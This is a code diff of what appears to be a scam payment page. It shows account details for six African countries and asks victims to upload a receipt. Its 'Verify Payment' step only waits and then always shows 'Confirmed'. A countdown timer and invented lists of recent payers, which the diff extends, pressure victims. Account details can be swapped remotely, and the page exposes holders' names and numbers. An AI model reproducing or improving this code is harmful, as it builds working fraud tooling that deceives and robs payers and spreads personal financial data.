@@ -92,7 +92,6 @@
         }
         .btn-main:active { transform: scale(0.96); }
 
-        /* MODAL STYLES */
         .modal-overlay {
             position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             display: none; align-items: center; justify-content: center; z-index: 8000;
@@ -105,7 +104,6 @@
 
         #overlay { position: fixed; inset: 0; background: rgba(10, 31, 28, 0.98); display: none; align-items: center; justify-content: center; flex-direction: column; z-index: 9999; backdrop-filter: blur(15px); }
         .loader-ring { width: 60px; height: 60px; border: 4px solid rgba(184, 213, 176, 0.1); border-top: 4px solid var(--stream-green); border-radius: 50%; animation: spin 0.8s linear infinite; }
-        
         @keyframes spin { 100% { transform: rotate(360deg); } }
 
         .activity-popup { 
@@ -192,18 +190,12 @@
     <div class="upload-card">
         <i class="fas fa-cloud-arrow-up text-5xl text-[#b8d5b0] mb-5"></i>
         <h2 class="text-xl font-black uppercase mb-2">Upload Receipt</h2>
-        <p class="text-white/50 text-xs mb-6 px-4">Please upload a clear screenshot of your successful transaction to proceed.</p>
-        
         <input type="file" id="receipt-input" accept="image/*" class="hidden" onchange="handleFileSelect()">
-        
-        <div onclick="document.getElementById('receipt-input').click()" id="upload-box" class="border-2 border-dashed border-white/20 rounded-2xl p-8 mb-6 cursor-pointer hover:border-[#b8d5b0] transition-all">
-            <p id="file-name" class="text-xs font-bold text-white/40">Click to select screenshot</p>
+        <div onclick="document.getElementById('receipt-input').click()" id="upload-box" class="border-2 border-dashed border-white/20 rounded-2xl p-8 mb-6 cursor-pointer">
+            <p id="file-name" class="text-xs font-bold text-white/40">Select screenshot</p>
         </div>
-
-        <button onclick="startVerification()" id="verify-btn" class="btn-main opacity-30 pointer-events-none">
-            Verify Payment <i class="fas fa-shield-check ml-1"></i>
-        </button>
-        <button onclick="closeUploadModal()" class="mt-4 text-[10px] font-black uppercase tracking-widest text-white/30">Cancel</button>
+        <button onclick="startVerification()" id="verify-btn" class="btn-main opacity-30 pointer-events-none">Verify Payment</button>
+        <button onclick="closeUploadModal()" class="mt-4 text-[10px] font-black text-white/30 uppercase">Cancel</button>
     </div>
 </div>
 
@@ -211,13 +203,11 @@
     <div id="loader-content" class="flex flex-col items-center">
         <div class="loader-ring"></div>
         <h3 class="mt-8 text-xl font-black text-[#b8d5b0] uppercase tracking-widest">Verifying</h3>
-        <p class="text-white/40 text-xs mt-3 font-bold uppercase tracking-widest text-center px-6">Syncing with Stream Network...</p>
     </div>
-    
     <div id="success-content" class="hidden flex flex-col items-center text-center">
         <i class="fas fa-circle-check text-7xl text-[#b8d5b0] animate-bounce"></i>
-        <h3 class="mt-6 text-2xl font-black text-white uppercase tracking-widest">Payment Confirmed</h3>
-        <p class="text-white/60 text-sm mt-2 font-bold uppercase tracking-widest">Redirecting to Dashboard...</p>
+        <h3 class="mt-6 text-2xl font-black text-white uppercase tracking-widest">Confirmed</h3>
+        <p class="text-white/60 text-sm mt-2 font-bold uppercase tracking-widest">Redirecting...</p>
     </div>
 </div>
 
@@ -239,14 +229,55 @@
     const auth = getAuth(app);
     const db = getFirestore(app);
 
+    const streamData = {
+        "uganda": { name: "Uganda", bank: "Airtel Uganda", number: "0708771078", holder: "ARINDA WINFRED", amount: "65,000 UGX" },
+        "south_africa": { name: "South Africa", bank: "STANDARD BANK", number: "10247413028", holder: "E K Dlamini", amount: "R350" },
+        "nigeria": { name: "Nigeria", bank: "Kuda", number: "3003439402", holder: "MORRISH M ENTERPRISE", amount: "₦15,000" },
+        "ghana": { name: "Ghana", bank: "MTN Mobile Money", number: "0534550779", holder: "Kingsley Annor", amount: "200 GHS" },
+        "cameroon": { name: "Cameroon", bank: "MTN Mobile money", number: "670312294", holder: "MARGARET NUYIN", amount: "12,000 XAF" },
+        "kenya": { name: "Kenya", bank: "MPESA", number: "0702552808", holder: "Rose Cherono", amount: "2,800 KSH" }
+    };
+
+    function setupUI(adminData = null) {
+        const selected = localStorage.getItem('selected_country') || 'nigeria';
+        const data = streamData[selected];
+        
+        if (data) {
+            document.getElementById('country-name-label').innerText = data.name;
+            document.getElementById('bank-name-display').innerText = data.bank;
+            document.getElementById('db-number').innerText = data.number;
+            document.getElementById('account-name-display').innerText = data.holder;
+            document.getElementById('display-amount').innerText = data.amount;
+
+            // ONLY OVERWRITE NIGERIA IF ADMIN HAS DATA
+            if(selected === 'nigeria' && adminData) {
+                if(adminData.nigeriaBank) document.getElementById('bank-name-display').innerText = adminData.nigeriaBank;
+                if(adminData.nigeriaNumber) document.getElementById('db-number').innerText = adminData.nigeriaNumber;
+                if(adminData.nigeriaHolder) document.getElementById('account-name-display').innerText = adminData.nigeriaHolder;
+                if(adminData.nigeriaAmount) document.getElementById('display-amount').innerText = adminData.nigeriaAmount;
+            }
+        }
+    }
+
+    async function initPage() {
+        setupUI(); // Load defaults first
+        try {
+            await signInAnonymously(auth);
+            onSnapshot(doc(db, "configs", "main"), (snap) => {
+                if(snap.exists()) setupUI(snap.data()); // Live update Nigeria details
+            });
+        } catch(e) { console.error("Cloud Error:", e); }
+    }
+
+    window.onload = initPage;
+
+    // UI HANDLERS
     window.openUploadModal = () => document.getElementById('upload-modal').style.display = 'flex';
     window.closeUploadModal = () => document.getElementById('upload-modal').style.display = 'none';
-
     window.handleFileSelect = () => {
         const file = document.getElementById('receipt-input').files[0];
         if (file) {
             document.getElementById('file-name').innerText = file.name;
-            document.getElementById('file-name').classList.replace('text-white/40', 'text-[#b8d5b0]');
             document.getElementById('verify-btn').classList.remove('opacity-30', 'pointer-events-none');
         }
     };
@@ -254,66 +285,16 @@
     window.startVerification = () => {
         closeUploadModal();
         document.getElementById('overlay').style.display = 'flex';
-        
-        // 15 Seconds Verification Logic
         setTimeout(() => {
             document.getElementById('loader-content').classList.add('hidden');
             document.getElementById('success-content').classList.remove('hidden');
-            
-            // Wait 3 seconds on success screen then redirect to MAIN DASHBOARD
-            setTimeout(() => {
-                window.location.href = 'main-dashboard.html';
-            }, 3000);
-        }, 15000);
+            setTimeout(() => { window.location.href = 'main-dashboard.html'; }, 3000);
+        }, 12000);
     };
-
-    function setupUI() {
-        const selected = localStorage.getItem('selected_country') || 'nigeria';
-        const data = streamData[selected];
-        if (data) {
-            document.getElementById('country-name-label').innerText = data.name;
-            document.getElementById('bank-name-display').innerText = data.bank;
-            document.getElementById('db-number').innerText = data.number;
-            document.getElementById('account-name-display').innerText = data.holder;
-            document.getElementById('display-amount').innerText = data.amount;
-        }
-    }
-
-    const streamData = {
-        "uganda": { name: "Uganda", bank: "Airtel Uganda", number: "0708771078", holder: "ARINDA WINFRED", amount: "65,000 UGX" },
-        "south_africa": { name: "South Africa", bank: "STANDARD BANK", number: "10247413028", holder: "E K Dlamini", amount: "R350" },
-        "nigeria": { name: "Nigeria", bank: "Kuda", number: "3003439402", holder: "MORRISH M ENTERPRISE", amount: "₦13,000" },
-        "ghana": { name: "Ghana", bank: "MTN Mobile Money", number: "0534550779", holder: "Kingsley Annor", amount: "200 GHS" },
-        "cameroon": { name: "Cameroon", bank: "MTN Mobile money", number: "670312294", holder: "MARGARET NUYIN", amount: "12,000 XAF" },
-        "kenya": { name: "Kenya", bank: "MPESA", number: "0702552808", holder: "Rose Cherono", amount: "2,800 KSH" }
-    };
-
-    async function initPage() {
-        setupUI();
-        try {
-            await signInAnonymously(auth);
-            onSnapshot(doc(db, "configs", "main"), (snap) => {
-                if(snap.exists()) {
-                    const d = snap.data();
-                    const selected = localStorage.getItem('selected_country') || 'nigeria';
-                    if(selected === 'nigeria') {
-                        if(d.nigeriaBank) document.getElementById('bank-name-display').innerText = d.nigeriaBank;
-                        if(d.nigeriaNumber) document.getElementById('db-number').innerText = d.nigeriaNumber;
-                        if(d.nigeriaHolder) document.getElementById('account-name-display').innerText = d.nigeriaHolder;
-                        if(d.nigeriaAmount) document.getElementById('display-amount').innerText = d.nigeriaAmount;
-                    }
-                }
-            });
-        } catch(e) { console.error("Cloud Error:", e); }
-    }
-
-    window.onload = initPage;
 
     window.copyNum = () => {
         const n = document.getElementById('db-number').innerText;
-        const el = document.createElement('textarea');
-        el.value = n; document.body.appendChild(el); el.select();
-        document.execCommand('copy'); document.body.removeChild(el);
+        navigator.clipboard.writeText(n);
         const btn = document.querySelector('.bank-details-wrapper');
         btn.style.opacity = "0.5";
         setTimeout(() => btn.style.opacity = "1", 200);
@@ -322,9 +303,7 @@
     let sec = 600;
     setInterval(() => {
         if(sec <= 0) return; sec--;
-        const mins = Math.floor(sec/60);
-        const s = (sec%60).toString().padStart(2,'0');
-        document.getElementById('timer').innerText = `${mins}:${s}`;
+        document.getElementById('timer').innerText = `${Math.floor(sec/60)}:${(sec%60).toString().padStart(2,'0')}`;
     }, 1000);
 
     const activities = [
@@ -332,7 +311,12 @@
         { name: "Kofi A.", loc: "Accra", amt: "200 GHS" },
         { name: "Blessing W.", loc: "Kampala", amt: "65,000 UGX" },
         { name: "Zanele D.", loc: "Joburg", amt: "R350" },
-        { name: "Musa K.", loc: "Nairobi", amt: "2,800 KSH" }
+        { name: "Musa K.", loc: "Nairobi", amt: "2,800 KSH" },
+        { name: "Chidi E.", loc: "Enugu", amt: "₦15,000" },
+        { name: "Sarah O.", loc: "Abuja", amt: "₦15,000" },
+        { name: "David T.", loc: "Kumasi", amt: "200 GHS" },
+        { name: "Grace L.", loc: "Port Harcourt", amt: "₦15,000" },
+        { name: "Ibrahim Y.", loc: "Kano", amt: "₦15,000" }
     ];
 
     let cur = 0;
